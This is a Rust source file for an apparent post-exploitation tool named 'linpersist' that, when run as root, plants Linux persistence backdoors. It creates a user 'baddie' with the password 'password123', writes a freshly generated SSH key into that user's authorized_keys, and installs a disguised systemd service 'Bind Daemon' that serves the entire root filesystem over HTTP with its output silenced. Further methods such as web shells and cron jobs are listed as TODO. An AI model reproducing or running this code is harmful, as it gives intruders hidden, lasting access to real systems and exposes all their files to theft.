/*
https://pberba.github.io/security

persistence methods:
    - web shell (TODO)
    - local account
    - ssh keys 
    - systemd service
    - cron job (TODO)
    - rc scripts (TODO)
    - init.d (TODO)
    - motd (TODO)
    - shell configs (TODO)

*/

use colored::*;
use clap::Parser;
use ssh_key::{LineEnding, PublicKey, PrivateKey, rand_core::OsRng, private::Ed25519Keypair};
use users::get_current_uid;

use std::io::Write;
use std::fs::OpenOptions;
use std::ops::DerefMut;
use std::process::{Command, Stdio, exit};
use std::borrow::Cow::Borrowed;


#[derive(Parser, Debug)]
struct Args {
    #[arg(short, long)]
    method: String,
}

// Add local user 
// --------------------------------------------------------------------------------------------------------- //
fn add_local_user() {
    let useradd_out = Command::new("which").arg("useradd").output().expect("failed to execute which");
    let stdout = String::from_utf8_lossy(&useradd_out.stdout);

    match stdout {
        Borrowed("") => println!("useradd not found"),
        _ => {
            println!("useradd found, adding user now");
            adduser();
            passwd(); 
        },    
    }
}

fn adduser() {
    let user = "baddie";

    // useradd <user>
    let useradd_out = Command::new("useradd").arg(user).output().expect("failed to execute useradd");
    let stderr = String::from_utf8_lossy(&useradd_out.stderr);

    match stderr {
        Borrowed("") => println!("{} added successfully", user.green()),
        _ => eprintln!("[error] {}", stderr.red()),
    }
}

fn passwd() {
    let password = "password123\n";

    // passwd <user>
    let mut passwd = Command::new("passwd");
    let passwd = passwd.arg("baddie");

    passwd.stdout(Stdio::null());
    passwd.stderr(Stdio::null());
    passwd.stdin(Stdio::piped());

    let mut passwd = passwd.spawn().expect("failed to execute passwd");
    let stdin = passwd.stdin.as_mut().expect("failed to open stdin");
    stdin.write_all(password.as_bytes()).expect("failed to write to stdin");
    stdin.write_all(password.as_bytes()).expect("failed to write to stdin");

    let status = passwd.wait().expect("failed to wait for passwd");

    if status.success() {
        println!("password added successfully");
    } else {
        eprintln!("[error] failed to add password");
    }
}
// --------------------------------------------------------------------------------------------------------- //


// Add ssh key
// --------------------------------------------------------------------------------------------------------- //
fn add_ssh_key() {
    let file_path = "/home/baddie/.ssh/authorized_keys";
    let key = generate_ed25519_pair();

    // mkdir -p /home/baddie/.ssh
    let mkdir_out = Command::new("mkdir").arg("-p").arg("/home/baddie/.ssh").output().expect("failed to execute mkdir");
    let stderr = String::from_utf8_lossy(&mkdir_out.stderr);

    match stderr {
        Borrowed("") => {
            println!("/home/baddie/.ssh created successfully");
            let mut file = OpenOptions::new().create(true).append(true).open(file_path).expect("failed to write public key to authorized_keys");
            writeln!(file, "{}", key).expect("failed to write to file");
        },
        _ => eprintln!("[error] failed to create /home/baddie/.ssh"),
    }
}

// returns public key for use elsewhere and prints private key to stdout. maybe not the best but fuck it
fn generate_ed25519_pair() -> String {
    let keypair = Ed25519Keypair::random(&mut OsRng);
    let pubkey = PublicKey::to_openssh(&PublicKey::from(keypair.public)).expect("failed to convert binary public key data to openssh format");
    let mut privkey = PrivateKey::to_openssh(&PrivateKey::from(keypair), LineEnding::LF).expect("failed to convert binary private key data to openssh format");


    println!("ssh key created. please save the following private key:");
    println!("{}", &privkey.deref_mut().clone());

    return pubkey
}
// --------------------------------------------------------------------------------------------------------- //


// Add systemd service with python server hosting /
// --------------------------------------------------------------------------------------------------------- //
fn add_systemd_service() {
    let file_path = "/etc/systemd/system/bindd.service";
    let service = r#"
[Unit]
Description=Bind Daemon

[Service]
ExecStart=python3 -m http.server --directory /
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
    "#;

    let mut file = OpenOptions::new().create(true).append(true).open(file_path).expect("failed to write systemd service file");
    writeln!(file, "{}", service).expect("failed to write systemd service file");

    let systemctl_enable_out = Command::new("systemctl").arg("enable").arg("bindd").output().expect("failed to execute systemctl");
    let stderr = String::from_utf8_lossy(&systemctl_enable_out.stderr);

    match stderr {
        Borrowed("") => println!("systemd service created successfully"),
        _ => eprintln!("[error] failed to created systemd service"),
    }

    let systemctl_start_out = Command::new("systemctl").arg("start").arg("bindd").output().expect("failed to execute systemctl");
    let stderr = String::from_utf8_lossy(&systemctl_start_out.stderr);

    match stderr {
        Borrowed("") => println!("systemd service started successfully"),
        _ => eprintln!("[error] failed to start systemd service"),
    }
}
// --------------------------------------------------------------------------------------------------------- //


// Add motd backdoor
// --------------------------------------------------------------------------------------------------------- //



fn main() {
    let uid = get_current_uid();

    if uid != 0 {
        eprintln!("[!] linpersist needs to be run as root");
        exit(0x0100);
    }

    let args = Args::parse();

    match args.method.as_str() {
        "user" => add_local_user(),
        "ssh" => add_ssh_key(),
        "systemd" => add_systemd_service(),
        _ => println!("why no methods?"),
    }
}
